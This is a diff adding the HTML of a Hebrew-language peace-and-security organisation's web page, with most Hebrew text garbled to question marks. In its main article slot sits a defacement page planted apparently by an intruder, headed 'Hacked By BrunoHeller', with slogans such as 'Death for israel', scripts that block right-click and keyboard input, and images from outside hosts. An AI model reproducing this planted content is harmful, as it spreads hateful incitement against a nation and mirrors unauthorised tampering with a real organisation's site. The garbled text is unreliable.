@@ -1,0 +1,1504 @@
+<!--<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">-->
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>?????? ????? ??????? - ????? ?????? ?????? ????? ??????</title>
+<meta name="keywords" content="">
+<meta name="description" content="">
+<link rel="stylesheet" href="css/ibeauty.css" type="text/css">
+<link rel="stylesheet" href="css/left-menu-style.css" type="text/css">
+<script type="text/javascript" src="include/jquery-1.2.2.pack.js"></script>
+<script type="text/javascript" src="include/ddaccordion.js"></script>
+<link rel="stylesheet" type="text/css" href="tabcontent.css">
+<link rel="stylesheet" type="text/css" href="css/print.css" media="print">
+<script type="text/javascript" src="tabcontent.js"></script>
+<script type="text/javascript" src="include/basicValidation.js"></script>
+<Script type="text/javaScript">
+function InterestsSelected() {
+	var sel = document.getElementById('???? ?????');
+	
+	if(sel.options[sel.selectedIndex].value == "0"){
+		document.getElementById('hidediv').style.display = 'block';
+		document.getElementById('hidediv2').style.display = 'block';
+	}
+	else {
+		document.getElementById('hidediv').style.display = 'none';
+		document.getElementById('hidediv2').style.display = 'none';
+	}
+}
+</script>
+<script type="text/javascript" src="include/left-menu-script.js"></script>
+<script type="text/javascript">
+	/*jQuery(document).ready(function(){
+		console.log(jQuery('.dont_print').find('.to_print'));
+		jQuery('.dont_print').find('*').not('.to_print').css('display', 'none');
+	});*/
+</script>
+
+
+
+<script type="text/javascript">var is_ie = false;</script>
+<!--[if IE]>
+<script type="text/javascript">is_ie = true;</script>
+<![endif]-->
+<script type="text/javascript">
+
+var menu1=new Array()
+menu1[0]='<a style=\'font-size:14px;\' href="index.php?Cat=36">?? ??????<\/a>';
+menu1[1]='<a style=\'font-size:14px;\' href="index.php?Cat=38">????? ?????? ??????? ??????<\/a>';
+menu1[2]='<a style=\'font-size:14px;\' href="index.php?Cat=37">????????? ????????<\/a>';
+menu1[3]='<a style=\'font-size:14px;\' href="index.php?Cat=39">????? ????? ?????? - ???"? ?????? ?????<\/a>';
+
+
+var menu11=new Array()
+menu11[0]='<a style=\'font-size:14px;\' href="index.php?id_cat_top=23">?????? ??????<\/a>';
+menu11[1]='<a style=\'font-size:14px;\' href="index.php?id_cat_top=42">??????<\/a>';
+menu11[2]='<a style=\'font-size:14px;\' href="index.php?id_cat_top=47">?????<\/a>';
+menu11[3]='<a style=\'font-size:14px;\' href="index.php?id_cat_top=24">??????<\/a>';
+menu11[4]='<a style=\'font-size:14px;\' href="index.php?id_cat_top=46">????? ??????<\/a>';
+menu11[5]='<a style=\'font-size:14px;\' href="index.php?Cat=25">???????? ?????<\/a>';
+menu11[6]='<a style=\'font-size:14px;\' href="http://www.peace-security.org.il/index.php?gal_cat=all">??????<\/a>';
+
+
+		
+var menuwidth='107px'; //default menu width
+var menubgcolor='white'; //menu bgcolor
+var disappeardelay=250; //menu disappear speed onMouseout (in miliseconds)
+var hidemenu_onclick="yes"; //hide menu when user clicks within menu?
+
+/////No further editting needed
+
+var ie4=document.getElementById;
+var ns6=document.getElementById;
+
+if (ie4||ns6)
+document.write('<div id="dropmenudiv" style="visibility:hidden;width:'+menuwidth+';background-color:'+menubgcolor+'" onMouseover="clearhidemenu()" onMouseout="dynamichide(event)"><\/div>');
+
+function getposOffset(what, offsettype, minus){
+var totaloffset=(offsettype=="right")? what.offsetLeft : what.offsetTop;
+var parentEl=what.offsetParent;
+while (parentEl!=null){
+totaloffset=(offsettype=="right")? totaloffset+parentEl.offsetLeft - minus : totaloffset+parentEl.offsetTop + 0.5;
+parentEl=parentEl.offsetParent;
+}
+return totaloffset;
+}
+
+
+function showhide(obj, e, visible, hidden, menuwidth){
+if (ie4||ns6)
+dropmenuobj.style.left=dropmenuobj.style.top="-500px";
+if (menuwidth!=""){
+dropmenuobj.widthobj=dropmenuobj.style;
+dropmenuobj.widthobj.width=menuwidth;
+}
+if (e.type=="click" && obj.visibility==hidden || e.type=="mouseover")
+obj.visibility=visible;
+else if (e.type=="click")
+obj.visibility=hidden;
+}
+
+function iecompattest(){
+return (document.compatMode && document.compatMode!="BackCompat")? document.documentElement : document.body;
+}
+
+function clearbrowseredge(obj, whichedge){
+var edgeoffset=0
+if (whichedge=="rightedge"){
+var windowedge=ie4 && !window.opera? iecompattest().scrollLeft+iecompattest().clientWidth-15 : window.pageXOffset+window.innerWidth-15;
+dropmenuobj.contentmeasure=dropmenuobj.offsetWidth;
+if (windowedge-dropmenuobj.x < dropmenuobj.contentmeasure)
+edgeoffset=dropmenuobj.contentmeasure-obj.offsetWidth;
+}
+else{
+var topedge=ie4 && !window.opera? iecompattest().scrollTop : window.pageYOffset;
+var windowedge=ie4 && !window.opera? iecompattest().scrollTop+iecompattest().clientHeight-15 : window.pageYOffset+window.innerHeight-18;
+dropmenuobj.contentmeasure=dropmenuobj.offsetHeight;
+if (windowedge-dropmenuobj.y < dropmenuobj.contentmeasure){ //move up?
+edgeoffset=dropmenuobj.contentmeasure+obj.offsetHeight;
+if ((dropmenuobj.y-topedge)<dropmenuobj.contentmeasure) //up no good either?
+edgeoffset=dropmenuobj.y+obj.offsetHeight-topedge;
+}
+}
+return edgeoffset
+}
+
+function populatemenu(what){
+if (ie4||ns6)
+dropmenuobj.innerHTML=what.join("");
+}
+
+
+function dropdownmenu(obj, e, menucontents, menuwidth, minus){
+if (window.event) event.cancelBubble=true;
+else if (e.stopPropagation) e.stopPropagation()
+clearhidemenu();
+dropmenuobj=document.getElementById? document.getElementById("dropmenudiv") : dropmenudiv;
+populatemenu(menucontents);
+
+if (ie4||ns6){
+showhide(dropmenuobj.style, e, "visible", "hidden", menuwidth);
+//dropmenuobj.x=getposOffset(obj, "right", minus);
+//dropmenuobj.y=getposOffset(obj, "top", minus);
+//dropmenuobj.style.left=dropmenuobj.x-clearbrowseredge(obj, "rightedge")+"px";
+
+//changed to fix IE
+dropmenuobj.style.left= parseInt(jQuery(obj).offset().left);
+if(is_ie){
+	dropmenuobj.style.left = (parseInt(dropmenuobj.style.left)/2) + "px";
+}
+dropmenuobj.style.left=parseInt(dropmenuobj.style.left)-clearbrowseredge(obj, "rightedge")+"px";
+
+//dropmenuobj.style.top=dropmenuobj.y-clearbrowseredge(obj, "bottomedge")+obj.offsetHeight+"px";
+dropmenuobj.style.top="270px";
+}
+
+return clickreturnvalue()
+}
+
+function clickreturnvalue(){
+if (ie4||ns6) return false
+else return true
+}
+
+function contains_ns6(a, b) {
+while (b.parentNode)
+if ((b = b.parentNode) == a)
+return true;
+return false;
+}
+
+function dynamichide(e){
+if (ie4&&!dropmenuobj.contains(e.toElement))
+delayhidemenu();
+else if (ns6&&e.currentTarget!= e.relatedTarget&& !contains_ns6(e.currentTarget, e.relatedTarget))
+delayhidemenu();
+}
+
+function hidemenu(e){
+if (typeof dropmenuobj!="undefined"){
+if (ie4||ns6)
+dropmenuobj.style.visibility="hidden";
+}
+}
+
+function delayhidemenu(){
+if (ie4||ns6)
+delayhide=setTimeout("hidemenu()",disappeardelay);
+}
+
+function clearhidemenu(){
+if (typeof delayhide!="undefined")
+clearTimeout(delayhide);
+}
+
+if (hidemenu_onclick=="yes")
+document.onclick=hidemenu;
+
+</script>
+
+
+
+<style type="text/css">
+	
+	#forgot_pass_modal{
+		border:10px groove #98bf21;
+		display:none;
+		position:absolute;
+		top:45%;
+		left:40%;
+		z-index:5000;
+		width:280px;
+		height:140px;
+		background-color: #EEE;
+	}
+	
+</style>
+
+</head>
+<body dir="rtl" style="margin:0px">
+
+<script type="text/javascript">
+	function show_restore_pass(){
+		jQuery("#forgot_pass_modal").show('fast');
+	}
+	
+	function restore_password(){
+		jQuery.post('./forgot_pass.php', {user_name:jQuery("#user_name").val()}, function(data){
+			jQuery("#msg").text(data);
+		});
+	}
+	
+	function hide_restore_pass(){
+		jQuery("#msg").text('');
+		jQuery("#forgot_pass_modal").hide('fast');
+	}
+</script>
+<div id="forgot_pass_modal">
+	<table width="100%">
+			<tr>
+				<th colspan="2" height="30" align="right">????? ?????</th>
+			</tr>
+			<tr>
+				<td>?? ?????: </td>
+				<td><input type="text" id="user_name" size="30"></td>
+			</tr>
+			<tr>
+				<td colspan="2">
+					<button onclick="restore_password();">???? ?????</button>
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					<button onclick="hide_restore_pass();">????</button>
+				</td>
+			</tr>
+			<tr><td colspan="2"><span id="msg" style="color:#d82348;font-weight:bold;"></span></td></tr>
+		</table>
+</div>
+
+
+<div style="background-position:top; background-repeat: no-repeat; background-image: url(top.jpg);">
+<table cellpadding="0" cellspacing="0" width="980"  border="0" align="center" dir="rtl">
+	
+
+
+
+	
+
+  
+
+	
+	
+	
+	
+	
+	
+	
+
+	
+	
+	
+	
+				
+<tr>
+					 
+
+<td width="224" nowrap valign="top" align="right" >
+<table cellpadding="0" cellspacing="0"  border="0" >
+
+
+
+
+<tr>
+
+
+<td valign="top" class="dont_print">
+<table cellpadding="0" cellspacing="0" border="0" width="100%">
+<tr><td height="80"></td></tr>		    
+<tr><td align="center" valign="top"><a href="main.php"><img src="logo.jpg" alt=""></a></td></tr>
+
+<tr><td height="75"></td></tr>	
+		
+<tr><td>
+<table cellpadding="0" cellspacing="0" border="0" width="100%" dir=ltr >
+<tr>
+<td align=center><a href="http://www.cmb.org.il/?source=english
+" title=""><img src="rus.png" alt="" ><br>???????</a></td>
+<td align=center><a href="http://www.peace-security-council.com/?source=CFPSheb
+" title=""><img src="eng.png" alt="" ><br>English</a></td>
+<!--<td align=center><a href="index.php"><img src="heb.png" alt="?????" ><br>?????</a></td> -->
+<td align=center><a href="http://www.facebook.com/pages/%D7%94%D7%9E%D7%95%D7%A2%D7%A6%D7%94-%D7%9C%D7%A9%D7%9C%D7%95%D7%9D-%D7%95%D7%91%D7%99%D7%98%D7%97%D7%95%D7%9F/136466429764517"><img src="facebook.png" alt="facebook" ><br>Facebook</a></td>
+</tr>
+</table>
+</td></tr>		
+
+<tr><td height="30"></td></tr>
+	
+	
+	
+<tr><td align=center>
+<form action="index.php" method="get">
+<table cellpadding="1" cellspacing="1" border=0  dir=rtl >
+<tr>
+<td>
+	<input type="text" value="????? ????" name="search_articles" 
+			onclick="if(this.value == '????? ????'){this.value='';this.style.color='#000';}
+					 else{this.select();}" 
+			onblur="if(this.value == ''){this.value='????? ????';this.style.color='#bbb';}"
+			style="color:#bbb;" >
+</td>
+<td><input type="submit" class="mbut" value="&nbsp;&nbsp;>&nbsp;&nbsp;" ></td>
+</tr>
+</table>
+</form>
+</td></tr>
+	
+	
+<tr><td height="30"></td></tr>
+	
+	
+	
+<tr>
+<td style="background:url(rbg.jpg) top center no-repeat;">
+<table width="100%" dir="rtl" align="center"  border=0 >
+
+
+
+   <tr>
+<td align="center" class=title>
+  ?????? ??????
+
+</td>
+</tr>
+  
+  
+  <tr>
+    <td>
+	<div class="arrowlistmenu" align="right" dir="rtl">
+							<h3 class='menuheader' style='font-size:14px;'><a href='index.php?id_cat_top=15'>?????? ???????</a></h3><h3 class='menuheader' style='font-size:14px;'><a href='index.php?id_cat_top=18'>?????? ????????? ???????</a></h3><h3 class='menuheader' style='font-size:14px;'><a href='index.php?Cat=16'>??????? ?????</a></h3><h3 class='menuheader' style='font-size:14px;'><a href='index.php?id_cat_top=44'>?????? ??? ????</a></h3><h3 class='menuheader' style='font-size:14px;'><a href='index.php?Cat=51'>?????????? ???? ???? ??????</a></h3>						</div>
+	</td>
+  </tr>
+  
+  
+  <tr><td height="30"><img src=men1.jpg alt=""></td></tr>
+
+
+
+<tr><td><a href="index.php?Cat=13"><img src=eztarfu.jpg alt=""></a></td></tr>
+  
+  
+  <tr><td height="30"><img src=men1.jpg alt=""></td></tr>
+  
+<tr>
+<td align="center" class=title>?????? ???? ????</td>
+</tr>
+  
+ <tr>
+<td align="center" style="padding-left:15px;padding-right:15px;">
+<!--<div><img src="milim.gif" alt="" ></div>-->
+<div>
+	<a href='index.php?search_articles=%D7%91%D7%98%D7%97%D7%95%D7%9F' style='text-decoration:none;'>
+				<span style='font-size: 12px'>?????</span>
+			  </a> &nbsp; <a href='index.php?search_articles=%D7%94%D7%9E%D7%95%D7%A2%D7%A6%D7%94+%D7%9C%D7%A9%D7%9C%D7%95%D7%9D+%D7%95%D7%91%D7%98%D7%97%D7%95%D7%9F' style='text-decoration:none;'>
+				<span style='font-size: 45px'>?????? ????? ??????</span>
+			  </a></div>
+<!--<div align=left><a href="#">???</a></div>-->
+</td>
+</tr>
+  
+<tr><td height="30"><img src=men1.jpg alt=""></td></tr>
+  
+  
+  
+  
+
+<!--
+  
+<tr>
+<td align="center" class=title>
+????? ?????? ??????:<BR>
+
+</td>
+</tr>
+
+
+<tr>
+			
+    <td>
+
+
+
+      <table align=center  width=160 border=0>
+		<tr>
+		   <form action="index.php?login=1" method="post" >
+		   <td  >?? ?????</td>
+		   <td colspan="2"><input name="Name" type="Text"  class="mboxes" style="width:70px;" ></td>
+		</tr>
+		<tr>
+		  <td >?????</td>
+		  <td colspan="2"><input name="Pass" type="Password"  class="mboxes" style="width:70px;"></td>
+		</tr>
+		<tr><td ><a href="#" onclick="show_restore_pass();return false;">????? ?????</a></td>
+		  <td><input type="submit"  class="mbut" value="?????"></td></form>
+
+		</tr>
+		
+		<tr><td height="5"></td></tr>
+		
+		<tr>
+		  <td colspan=2 align="center" style="border-top:1px solid #c3c3c3; padding-top:5px;">
+	
+		  <a href="index.php?Cat=67" style="color:green;">????? ????</a><BR>
+		  
+		  </td>
+		</tr>
+	  </table>
+
+  
+
+
+			  </td>
+			</tr>
+			
+		-->	
+			
+			
+
+			
+			
+			
+			
+			
+		
+	
+
+
+
+<tr>
+<td align="center" class=title>???? ?????? ???????!</td>
+</tr>
+
+
+
+<tr>
+<td >
+ <table width="100%"  >
+ <tr><td height="20"  align="center" >
+???? ????????
+  </td></tr> 
+
+<tr><td height="20" align="center" >
+<input type="button" class="mbut" value="?????" onClick="document.location.href='index.php?Cat=-1';"><BR>
+
+</td></tr> 
+
+
+ </table>
+</td>
+</tr>
+
+
+	<tr><td height="30"><img src=men1.jpg alt=""></td></tr>
+			
+
+
+
+	<!--
+<tr>
+<td align="center" class=title>??? ???????</td>
+</tr>
+
+
+
+
+
+
+
+  <tr>
+	<td align="center" style="padding-top:5px;padding-bottom:15px;">   
+  
+  <script type="text/javascript">
+     function MM_showHideLayers() { //v3.0
+  var args=MM_showHideLayers.arguments;
+
+  document.getElementById(args[0]).style.visibility=args[2];
+ document.getElementById(args[0]).style.position="absolute"; 
+  document.getElementById(args[0]).style.left="600px"; 
+  
+  
+
+}
+
+
+           </script>
+     
+<link rel="stylesheet" type="text/css" href="style5.css">
+
+<table  align=center cellpadding=5 cellspacing=0 width=160><tr><td align=center><table border=0 cellpadding=2 cellspacing=0 dir=rtl bgcolor=#d4dbdf width=100%>   
+<td align=right><a href=/?a=2013&m=8>
+<img src="droite1.gif" border="0"></a></td><td align=center><font color=#868f98 face=verdana size=3><b>??????</b></font></td><td align=left><a href=/?a=2013&m=10><img src="gauche1.gif" border="0"></a></td>   </table><table width=100% dir=rtl border=0  align=center cellspacing=0 cellpadding=0><td><table width=100%   cellspacing="1"    cellpadding="1" border="0" align="center">
+<tr><td colspan=7><table   width=100% border="0" cellspacing="1" cellpadding="0" bordercolor=#E5E5E5><tr><td align=center width=25><b><font color=#868f98 size=2>?</font></b></td><td align=center width=25><b><font color=#868f98 size=2>?</font></b></td><td align=center width=25><b><font color=#868f98 size=2>?</font></b></td><td align=center width=25><b><font color=#868f98 size=2>?</font></b></td><td align=center width=25><b><font color=#868f98 size=2>?</font></b></td><td align=center width=25><b><font color=#868f98 size=2>?</font></b></td><td align=center width=25><b><font color=#1d77a5 size=2>?</font></b></td></tr></table></td></tr>
+<tr><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >1</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >2</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >3</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >4</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >5</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >6</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >7</font></td></tr>
+<tr><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >8</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >9</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >10</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >11</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >12</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >13</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >14</font></td></tr>
+<tr><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >15</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >16</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >17</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >18</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >19</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >20</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >21</font></td></tr>
+<tr><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >22</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >23</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >24</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >25</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >26</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >27</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >28</font></td></tr>
+<tr><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >29</font></td><td  class="oday" align=center bgcolor=#d4dbdf ><font size=2 style=color:#577192; >30</font></td><td class="oday"><p>&nbsp;</p></td><td class="oday"><p>&nbsp;</p></td><td class="oday"><p>&nbsp;</p></td><td class="oday"><p>&nbsp;</p></td><td class="oday"><p>&nbsp;</p></td></tr>
+</table></td></tr></table></td></tr></table>
+ </td>
+	 </tr> 
+	 
+	 <tr>
+	<td style="padding-right:20px;padding-left:20px;padding-bottom:20px;" valign="top" >
+	<table  cellpadding="0" cellspacing="0" >
+	  <tr>
+	    <td id="hadashot" style="font-size: 12px; ">
+		 <p  style="color: #006cd7; background:#FFFFFF;padding:2px;">??????? ??????:</p>
+					</td>
+	  </tr>
+	</table>
+		  
+		</td>
+  </tr>
+  
+
+
+
+-->
+
+
+
+	
+			
+			
+			
+			
+			
+			
+		  </table>
+		 </td>
+
+</tr>
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+ <tr><td height="30"></td></tr>
+
+
+
+<!--
+<tr>
+<td style="padding-right:15px;padding-left:15px;">
+ <table width="100%" bgcolor="#f5f5f5" style="border:1px solid #e7e7e7"  >
+
+
+
+
+ <tr><td height="20" >
+<marquee style=" padding: 4px;"  direction="up"  scrollamount="1"  width="140" height="80" align="middle" onmouseover="this.stop();" onmouseout="this.start();">
+
+	
+</marquee>
+  </td></tr> 
+
+
+
+
+ </table>
+</td>
+</tr>-->
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</table>
+</td>	
+
+
+<td width=13><img src="pics/1px.gif" width=13 alt=""></td>
+
+
+<td WIDTH="743" nowrap valign="top" height="100%">
+  <table cellpadding="0" cellspacing="0" width="100%" border="0">
+
+			
+	
+	
+	
+	
+	
+	   
+	   
+	   
+	   
+		
+	<!-- top area -->
+	
+<tr>
+<td valign="top" align=left>
+<table cellpadding="0" cellspacing="0"  border="0">
+
+
+
+<tr>
+<td  valign="top" height=192  >
+
+ <OBJECT CLASSID="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" CODEBASE="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" WIDTH="740" HEIGHT="192" >
+<PARAM NAME="MOVIE" VALUE="banner.swf"><PARAM NAME="PLAY" VALUE="true"><PARAM NAME="LOOP" VALUE="true"><PARAM NAME="WMODE" VALUE="transparent"><PARAM NAME="QUALITY" VALUE="besth">
+<EMBED SRC="banner.swf" WIDTH="740" HEIGHT="192" PLAY="true" LOOP="true" WMODE="transparent" QUALITY="best" TYPE="application/x-shockwave-flash"	PLUGINSPAGE="http://www.macromedia.com/go/getflashplayer"></EMBED></OBJECT>
+
+</td>
+
+</tr>
+</table>
+</td>
+</tr>
+	   
+
+
+	
+		<!-- end top area -->
+	
+	
+			
+<tr>
+
+<td  valign="top" height="100%" >
+
+
+
+ 
+
+<!-- center -->
+<table cellpadding="0" cellspacing="0" width="100%" border="0" >
+
+
+
+
+
+
+
+<tr><td height="28"></td></tr>
+
+
+
+<tr>
+<td id="" colspan="3" width="100%" align="center" valign="top" align="center" >
+
+<table border="0" cellpadding="0" cellspacing="0" align="center" >
+<tr>
+
+<td height='40' align='center' class='menuhlink' width='130' ><a href='index.php?Cat=1' onMouseover="dropdownmenu(this, event, menu1, '200', 8)" onMouseout="delayhidemenu()">????? ??????</a></td><td><img src=driver.jpg alt=''></td><td height='40' align='center' class='menuhlink' width='130'><a  href='index.php?administration'>????? ??????</a></td><td><img src='driver.jpg' alt=''></td><td height='40' align='center' class='menuhlink' width='130' ><a href='index.php?id_cat_top=11' onMouseover="dropdownmenu(this, event, menu11, '200', 8)" onMouseout="delayhidemenu()">?????? ????????</a></td><td><img src=driver.jpg alt=''></td><td height='40' align='center' class='menuhlink' width='130'><a  href='index.php?Cat=13'>????? ??????</a></td><td><img src='driver.jpg' alt=''></td><td height='40' align='center' class='menuhlink' width='130'><a  href='index.php?id_cat_top=26'>??????</a></td><td><img src='driver.jpg' alt=''></td><td height='40' align='center' class='menuhlink' width='130'><a  href='http://peace-security.org.il/index.php?contact=all'>??? ???</a></td><td><img src='driver.jpg' alt=''></td>
+</tr>
+</table>
+</td>
+</tr>
+
+<tr><td height="15"></td></tr>
+
+<tr><td valign=top  >
+<table style="background:url(topbg.jpg) bottom repeat-x;" border=0>
+<tr>
+
+<td valign=top width=350 style="padding-right:15px;padding-left:15px;">
+<a href="Hacked By BrunoHeller " target="_blank">
+	<h2 style="">Hacked By BrunoHeller </h2>
+</a>
+<div style="color:#7b7b7b;">???: <span style="color:#7b7b7b;"> Hacked By BrunoHeller  </span><br/><br/></div>
+<div style="font-size:16px;direction:rtl;text-align:justify;">
+ 
+<html dir="rtl">
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="description" content="HACKED BY BrunoHeller I AM HACK TO SEND MESSAGE , MY MESSAGE =-> Read Qur'an -> FREE PALESTINE -> Falagua team -> DIE FOR ISRAEL">
+<meta name="keywords" content="HACKED BY BrunoHeller">
+
+
+
+<link rel="SHORTCUT ICON" href="http://www.tounsi.biz/favicon.ico">
+<script type="text/javascript">               
+
+/*****************************************
+* Visit our site at http://www.star28.com/ for more code
+* This notice must stay intact for use
+***********************************************/            
+//change 1 to another integer to alter the scroll speed. Greater is faster               
+var speed=1      
+var currentpos=0,alt=1,curpos1=0,curpos2=-1               
+function initialize(){               
+startit()               
+}               
+function scrollwindow(){               
+if (document.all)               
+temp=document.body.scrollTop               
+else               
+temp=window.pageYOffset               
+if (alt==0)               
+alt=1               
+else               
+alt=0               
+if (alt==0)               
+curpos1=temp               
+else               
+curpos2=temp               
+if (curpos1!=curpos2){               
+if (document.all)               
+currentpos=document.body.scrollTop+speed               
+else               
+currentpos=window.pageYOffset+speed               
+window.scroll(0,currentpos)               
+}               
+else{               
+currentpos=20               
+window.scroll(0,currentpos)               
+}               
+}               
+function startit(){               
+setInterval("scrollwindow()",30)               
+}               
+window.onload=initialize               
+</script>
+
+<style type=text/css>
+.body{
+margin: 30px  0px  20px  0px ;
+text-shadow: 0px 0px 4px #000000;
+
+}
+.image-box img { 
+   box-shadow: 0px 0px 10px #ddd;
+   -moz-box-shadow: 0px 0px 10px #000000;
+   -webkit-box-shadow: 0px 0px 10px #000000;
+   border: 6px solid #eee;
+   padding: 20px #ddd;
+   transform: rotate(-5deg);
+   -moz-transform: rotate(-5deg);
+   -webkit-transform: rotate(-5deg);
+   margin:20px 0px 10px 0px ;
+   }
+   .image-box img:hover{ 
+   padding: 20px #aaaaa;
+   transform: rotate(0deg);
+   -moz-transform: rotate(0deg);
+   -webkit-transform: rotate(0deg);
+   }
+.bacr{
+background:#444;
+border: 1px #ffffff;
+
+
+}
+.bacr:hover{
+background:#777;
+
+}
+
+.gambargetar {
+ position: relative;
+ }
+
+.page{
+background:#666666;
+border-radius: 14px;
+width:85%;
+border:yellow 5px dashed ;
+
+text-wrap:none;
+margin: 0px  0px  0px  0px ;
+
+}
+.font{
+line-height:130%;
+font-size:55px;
+font-family:impact;
+color:#ffffff;
+text-shadow: 0px 0px 4px #000000; 
+}
+
+
+.nfont{
+line-height:130%;
+font-size:45px;
+font-family:arial;
+color:yellow;
+text-shadow: 0px 0px 4px #000000; 
+}
+a:hover{
+line-height:130%;
+font-size:45px;
+font-family:impact;
+color:green;
+text-shadow: 0px 0px 4px #000000; 
+}
+
+a{
+line-height:130%;
+font-size:45px;
+font-family:impact;
+color:#ffffff;
+text-shadow: 0px 0px 4px #000000; 
+text-decoration:none;
+
+}
+.facebook ,.facebook a{
+	position: fixed;
+	float: right;
+	width:45;
+	height:45;
+	background: yellow;
+	border-radius: 10px 0px 0px 10px;
+	border:solid 1px #000;
+	cursor:pointer;
+	font-size: 0;
+	right: 0;
+	direction: ltr;
+}
+.facebook:hover,.facebook a:hover{
+
+	width:205;
+	text-align:left ;
+	font-size: 30;
+	right: 0;
+	color: #000;
+	font-family:impact;
+	text-shadow: 0px 0px 4px #ffffff; 
+	z-index: 11;
+}
+</style>
+
+<!-- this script got from www.javascriptfreecode.com coded by: Krishna Eydatoula-->
+<title>hacked by BrunoHeller</title>
+</head>
+<body  oncontextmenu="alert('copyright recived to @ \n \n https://www.facebook.com/ ');return false;" onkeydown="return false;"  bgcolor='#DDD'>
+
+<center>
+
+	<div div class=facebook><a href="https://www.facebook.com/" target="_blank" ><img  src="http://cdn1.iconfinder.com/data/icons/inside/PNG/048x048/icontexto-inside-facebook.png"  style="position: fixed; right: 0; z-index: 99; direction: ltr;">&nbsp; my account  </a></div>
+<div class=body>
+
+
+<div class=page><p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p><p align="center">
+
+<img src="http://media.digitalphotogallery.com/ednnrvskpcee/images/144b7b44-4b99-11e1-9d14-fefd616b8533/fucked01_website_image_rkml_wuxga.jpg?20120130232141"  width="50%" >
+
+<br>
+<br><br>
+<br>
+<div class=font>Hacked by BrunoHeller</div></b></p>
+<div class=font> &#1575;&#1604;&#1605;&#1608;&#1578; &#1604;&#1573;&#1587;&#1585;&#1575;&#1574;&#1610;&#1604;  </div></b></p>
+<p align="center">
+&nbsp;</p>
+<p align="center">
+<div class=font><hr width=80%></div></p>
+<div class=font>my message</div></p>
+<p align="center">&nbsp;</p><p align="center"></p>&nbsp;</p>
+<img  border="0" src="http://im24.gulfup.com/2012-09-19/134806488971.gif" width="500" height="200"></p>
+
+<div class=bacr><center><p align="center"><b><div class=nfont>Read Qur'an </div></b>
+</p></div>
+<p align="center">
+<div class="image-box">
+<img class=image-box border="0" src="http://www.world-insights.com/wp-content/uploads/2012/11/read-quran-recharge-your-iman_islamic-quotes-timeline-cover-photo.jpg" width="700" height="300"></div></p>
+<div class=bacr><center><p align="center"><b><div class=nfont>Freedom For Barghouthi</div></b>
+</p></div>
+<p align="center">
+<div class="image-box">
+<img class=image-box border="0" src="https://fbcdn-sphotos-a-a.akamaihd.net/hphotos-ak-ash4/q71/382548_142389412629066_1102370006_n.jpg" width="700" height="300"></div></p>
+
+
+<p align="center">&nbsp;</p>
+<div class=bacr>
+	<p align="center"><b><div class=nfont>free Palestine </div>
+	</p>
+	<center><p></div>
+<div class="image-box">
+<img class=image-box border="0" src="http://www.topnews.in/files/palestinian-flag_001.jpg" width="500" height="331"></div></p>
+<p align="center">
+<center><p><div class=nfont><div class=bacr>Falagua Team</div></div></font></p>
+<p align="center">
+<div class="image-box">
+<img class=image-box border="0" src="http://cdn.itproportal.com/photos/hacker1-540x334_contentfullwidth.jpg" width="449" height="331"></div></p>
+</p>
+
+
+<p><div class=nfont><div class=bacr>Death for israel</div></div></font></p>
+<p align="center">
+<div class="image-box">
+<img class=image-box border="0" src="http://news.fatakat.com/photos/sxjrhAruCJwCAbea.jpg" width="499" height="331"></div></p>
+</p>
+<p align="center">&nbsp;</p>
+
+<p><b><span>
+
+			<font size="6" color="#FFFFFF" style="text-shadow: '0px 0px 6px rgb(255', 0, 0), '0px 0px 5px rgb(300', 0, 0), '0px 0px 5px rgb(300', 0, 0); color: #ffffff; font-weight: bold">
+
